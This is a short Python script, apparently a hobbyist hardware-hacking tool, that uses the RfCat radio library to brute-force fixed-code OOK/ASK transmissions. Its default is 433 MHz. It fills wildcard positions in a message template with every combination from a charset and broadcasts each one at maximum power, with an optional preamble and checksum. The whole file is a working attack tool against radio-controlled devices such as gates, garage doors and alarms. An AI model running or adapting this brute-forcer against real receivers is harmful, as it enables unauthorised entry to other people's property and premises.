from rflib import *
import time
import bitstring
import argparse
import itertools

class Brookforce(object):
    def __init__(self, frequency=None, rate=None, preamble=None, message=None, repeat=1, checksum=None, charset="01", verbose=False):
        self.frequency = frequency
        self.rate = rate
        self.verbose = verbose
        self.preamble = preamble
        self.message = message

        self.checksum = checksum
        self.repeat = repeat
        self.charset = charset.decode('string_escape')

    def emit(self):

        d = RfCat()
        d.setMdmModulation(MOD_ASK_OOK)
        d.setFreq(self.frequency)
        d.setMaxPower()
        d.setMdmDRate(self.rate)

        if self.preamble is not None:
            preamble = self.build_preamble()

        for message in self.build_message():
            if all(c in '01' for c in message):
                message = bitstring.BitArray(bin=message).tobytes()

            if self.verbose:
                print('MESSAGE : %s' % (repr(message)))

            if self.preamble is not None:
                d.makePktFLEN(len(preamble))
                d.RFxmit(preamble)
            
            d.makePktFLEN(len(message))    
            for i in xrange(self.repeat):
                d.RFxmit(message)
               
        d.setModeIDLE()

    def build_preamble(self):
        if all(c in '01' for c in self.preamble):
            return bitstring.BitArray(bin=self.preamble).tobytes()
        else:
            return self.preamble

    def build_message(self):
        frmt_message = self.message.replace("?", "%s")
        nb_bf = frmt_message.count("%s")

        for combination in itertools.product(self.charset, repeat=nb_bf):
            final_message = frmt_message % combination
            final_message = final_message.decode('string_escape')
            if "#CHECKSUM#" in self.message:
                if self.checksum is not None:
                    checksum = self.checksum(final_message)
                    final_message = final_message.replace("#CHECKSUM#", checksum)
                else:
                    raise Exception("Warning, checksum in message, but no checksum method defined")
            
            yield final_message

if __name__ == "__main__":
    """ Test method (example)
    """
    parser=argparse.ArgumentParser(description="Bruteforce OOK/ASK")
    parser.add_argument('-p', '--preamble', help='message preamble', default=None)
    parser.add_argument('-c', '--charset', help='bruteforce charset', default="01")
    parser.add_argument('-m', '--message', help='raw message', required=True)
    parser.add_argument('-f', '--frequency', help='frequency', default=433000000, type=int)
    parser.add_argument('-r', '--rate', help='rate', default=2500, type=int)
    parser.add_argument('-x', '--repeat', help='repeat', default=1, type=int)
    parser.add_argument('-v', '--verbose', help='verbose mode', action="store_true")

    args = vars(parser.parse_args())

    def simple_crc(message):
        return "01" # static crc, write your own here !

    bf = Brookforce(preamble=args['preamble'], 
                    message=args['message'],
                    frequency=args['frequency'],
                    rate=args['rate'],
                    repeat=args['repeat'],
                    verbose=args['verbose'],
                    charset=args['charset'],
                    checksum=simple_crc)
    
    bf.emit()